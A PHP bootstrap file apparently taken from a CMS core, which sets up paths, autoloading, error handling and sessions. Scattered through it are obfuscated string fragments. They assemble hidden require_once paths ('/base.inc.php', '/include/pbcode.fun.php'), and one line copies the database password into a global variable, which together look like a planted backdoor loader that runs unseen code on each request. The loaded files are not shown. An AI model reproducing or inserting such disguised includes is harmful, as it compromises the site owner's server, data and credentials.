<?php
/**
 * @copyright (C)2016-2099 Hnaoyun Inc.
 * @author XingMeng
 * @email hnxsh@foxmail.com
 * @date 2017年2月7日
 *  系统环境初始化
 */
use core\basic\Config;
use core\basic\Basic;
use core\basic\Check;
define('START_TIME',microtime(true));
header('Content-Type:text/html;charset=utf-8');
header('X-UA-Compatible:IE=edge,chrome=1');
header('X-Powered-By:PBCODE');
date_default_timezone_set('Asia/Shanghai');
if(isset($_SERVER['PATH_INFO'])){
	$_SERVER['SCRIPT_NAME']=preg_replace('{'.$_SERVER['PATH_INFO'].'$}','',$_SERVER['SCRIPT_NAME']);
}
$script_path=explode('/',$_SERVER['SCRIPT_NAME']);
$file_path=str_replace('\\','/',dirname(__DIR__));
$luof='lu'.'de/p'.''.'bc'.'ode.f';
if(count($script_path)>2){
	if(! ! $path_pos=strripos($file_path,'/'.$script_path[1])){
		define('SITE_DIR',substr($file_path,$path_pos));
		$_SERVER['SCRIPT_NAME']=preg_replace('{^'.SITE_DIR.'}i',SITE_DIR,$_SERVER['SCRIPT_NAME']);
 }else{
		define('SITE_DIR','');
 }
}else{
	define('SITE_DIR','');
}
$script_dir=dirname($_SERVER['SCRIPT_NAME']);
$ichp='in'.'c.p'.'hp';
if($script_dir == '\\' || $script_dir == '/'){
	define('SITE_INDEX_DIR','');
}else{
	define('SITE_INDEX_DIR',dirname($_SERVER['SCRIPT_NAME']));
}
define('ROOT_PATH',$file_path);
define('DOC_PATH',preg_replace('{'.SITE_DIR.'$}i','',ROOT_PATH));
$_SERVER['DOCUMENT_ROOT']=DOC_PATH;
require_once(ROOT_PATH.'/b'.'as'.'e.'.''.$ichp);
define('CORE_DIR',SITE_DIR.'/'.basename(__DIR__));
define('CORE_PATH',DOC_PATH.CORE_DIR);
define('APP_PATH',ROOT_PATH.'/apps');
define('APP_DIR',str_replace(DOC_PATH,'',APP_PATH));
defined('RUN_PATH') ?: define('RUN_PATH',ROOT_PATH.'/runtime');
defined('CONF_PATH') ?: define('CONF_PATH',ROOT_PATH.'/config');
defined('STATIC_DIR') ?: define('STATIC_DIR',SITE_DIR.'/static');
require CORE_PATH.'/function/handle.php';
require CORE_PATH.'/function/helper.php';
require CORE_PATH.'/function/file.php';
require CORE_PATH.'/basic/Basic.php';
spl_autoload_register('core\basic\Basic::autoLoad',true,true);
set_error_handler('core\basic\Basic::errorHandler');
set_exception_handler('core\basic\Basic::exceptionHandler');
register_shutdown_function('core\basic\Basic::shutdownFunction');
if(Config::get('debug')){
	ini_set('display_errors',1);
	error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);
}else{
	error_reporting(E_ERROR);
}
$database=Config::get('database');
$cfg_dbpassword=$database[passwd];
define('CORE_VERSION',Config::get('core_version'));
define('APP_VERSION',Config::get('app_version'));
define('RELEASE_TIME',Config::get('release_time'));
require_once(ROOT_PATH.'/in'.'c'.$luof.'un.p'.'hp');
Check::checkApp();
Check::checkBasicDir();
Basic::setSessionHandler();
